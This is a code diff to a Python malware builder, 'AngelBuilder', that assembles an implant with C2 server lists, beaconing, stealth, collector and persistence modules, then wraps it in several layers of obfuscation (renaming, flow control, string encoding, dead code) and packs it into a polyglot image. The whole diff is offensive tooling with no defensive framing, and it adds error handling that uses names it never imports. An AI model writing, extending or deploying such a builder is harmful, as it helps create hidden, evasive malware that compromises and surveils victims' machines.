@@ -9,14 +9,19 @@ from pathlib import Path
 from typing import Dict, Any, Optional
 from core.crypter import Crypter
 from core.obfuscator import CodeObfuscator
+from core.resilience import ResilienceManager
+from core.integrator import SystemIntegrator
 from modules.polyglot import PolyglotBuilder
 
 class AngelBuilder:
     def __init__(self):
+        # Initialize system integrator
+        self.integrator = SystemIntegrator()
         self.crypter = Crypter()
-        self.obfuscator = CodeObfuscator()
+        self.obfuscator = self.integrator.obfuscator
         self.polyglot = PolyglotBuilder()
         self.build_dir = Path(tempfile.mkdtemp())
+        self.resilience = self.integrator.resilience
         
     def create_config(self, args: argparse.Namespace) -> Dict[str, Any]:
         """Create configuration from arguments"""
@@ -26,7 +31,29 @@ class AngelBuilder:
             'dns_servers': args.dns_servers.split(',') if args.dns_servers else ['8.8.8.8'],
             'beacon_interval': args.beacon_interval,
             'stealth_level': args.stealth_level,
-            'c2_servers': args.c2_servers.split(',') if args.c2_servers else []
+            'c2_servers': args.c2_servers.split(',') if args.c2_servers else [],
+            # Nouvelles configurations
+            'resilience': {
+                'backup_interval': 3600,
+                'max_retries': 3,
+                'retry_delay': 5,
+                'error_thresholds': {
+                    'LOW': 10,
+                    'MEDIUM': 5,
+                    'HIGH': 3,
+                    'FATAL': 1
+                }
+            },
+            'obfuscation': {
+                'enabled': True,
+                'complexity': 3,
+                'layers': [
+                    'rename',
+                    'flow_control',
+                    'string_encode',
+                    'dead_code'
+                ]
+            }
         }
         
         # Remove None values
@@ -34,46 +61,77 @@ class AngelBuilder:
         
     def prepare_build_directory(self):
         """Prepare build directory with required files"""
-        # Create directories
-        (self.build_dir / 'core').mkdir(exist_ok=True)
-        (self.build_dir / 'modules').mkdir(exist_ok=True)
-        
-        # Copy core files
-        core_files = ['crypter.py', 'obfuscator.py', 'stealth.py', 'brain.py']
-        for file in core_files:
-            shutil.copy2(f'core/{file}', self.build_dir / 'core' / file)
+        try:
+            # Create directories
+            (self.build_dir / 'core').mkdir(exist_ok=True)
+            (self.build_dir / 'modules').mkdir(exist_ok=True)
+            (self.build_dir / 'config').mkdir(exist_ok=True)
             
-        # Copy module files
-        module_files = [
-            'collector.py', 'network.py', 'router.py', 
-            'comms.py', 'persistence.py'
-        ]
-        for file in module_files:
-            shutil.copy2(f'modules/{file}', self.build_dir / 'modules' / file)
+            # Copy core files
+            core_files = [
+                'crypter.py', 'obfuscator.py', 'stealth.py', 'brain.py',
+                'resilience.py', 'integrator.py'
+            ]
+            for file in core_files:
+                shutil.copy2(f'core/{file}', self.build_dir / 'core' / file)
+                
+            # Copy module files
+            module_files = [
+                'collector.py', 'network.py', 'router.py', 
+                'comms.py', 'persistence.py'
+            ]
+            for file in module_files:
+                shutil.copy2(f'modules/{file}', self.build_dir / 'modules' / file)
+                
+            # Copy config files
+            shutil.copy2('config/settings.py', self.build_dir / 'config' / 'settings.py')
+                
+            # Copy main file
+            shutil.copy2('main.py', self.build_dir / 'main.py')
             
-        # Copy main file
-        shutil.copy2('main.py', self.build_dir / 'main.py')
-        
+        except Exception as e:
+            self.resilience.handle_error(
+                e,
+                ErrorCategory.FILESYSTEM,
+                ErrorSeverity.HIGH
+            )
+            raise
+            
     def build_payload(self, config: Dict[str, Any]) -> str:
         """Build the payload code"""
-        # Read main script
-        with open(self.build_dir / 'main.py', 'r') as f:
-            main_code = f.read()
-            
-        # Inject configuration
-        config_code = f'''
+        try:
+            # Read main script
+            with open(self.build_dir / 'main.py', 'r') as f:
+                main_code = f.read()
+                
+            # Inject configuration
+            config_code = f'''
 if __name__ == "__main__":
     config = {json.dumps(config, indent=4)}
     angel = Angel(config)
     angel.run()
 '''
-        main_code = main_code.replace('if __name__ == "__main__":\n    main()', config_code)
-        
-        # Obfuscate the code
-        obfuscated_code = self.obfuscator.obfuscate_code(main_code)
-        
-        return obfuscated_code
-        
+            main_code = main_code.replace('if __name__ == "__main__":\n    main()', config_code)
+            
+            # Obfuscate le code avec plusieurs couches
+            obfuscated_code = main_code
+            for layer in config['obfuscation']['layers']:
+                obfuscated_code = self.obfuscator.obfuscate_code(
+                    obfuscated_code,
+                    method=layer,
+                    complexity=config['obfuscation']['complexity']
+                )
+                
+            return obfuscated_code
+            
+        except Exception as e:
+            self.resilience.handle_error(
+                e,
+                ErrorCategory.PROCESS,
+                ErrorSeverity.HIGH
+            )
+            raise
+            
     def build_image(self, args: argparse.Namespace) -> Optional[str]:
         """Build the final polyglot image"""
         try:
